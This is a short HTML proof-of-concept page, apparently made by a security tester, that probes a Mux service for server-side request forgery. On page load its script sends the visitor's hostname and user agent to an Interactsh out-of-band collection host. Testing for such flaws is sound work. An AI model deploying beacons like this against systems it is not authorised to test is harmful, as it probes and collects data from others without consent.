<!DOCTYPE html>
<html>
<head>
    <title>Mux SSRF Test</title>
    <script>
        // Function to send a "ping" to your Interactsh server
        function logVisit() {
            // Use an Image object to make a GET request to your Interactsh URL
            // This is a common trick to send data without CORS issues
            const img = new Image();
            // This URL will appear in your Interactsh logs
            img.src = "https://qqbatpnjqjnadljurlznc3gsxop1cg1wy.oast.fun/?log=visited&host=" + encodeURIComponent(window.location.hostname) + "&useragent=" + encodeURIComponent(navigator.userAgent);
            console.log("Visit logged to Interactsh.");
        }
        // Run the function as soon as the page loads
        window.onload = logVisit;
    </script>
</head>
<body>
    <p>This page is a test for SSRF. If the Mux server fetches this URL, it will trigger a request to my Interactsh server.</p>
</body>
</html>
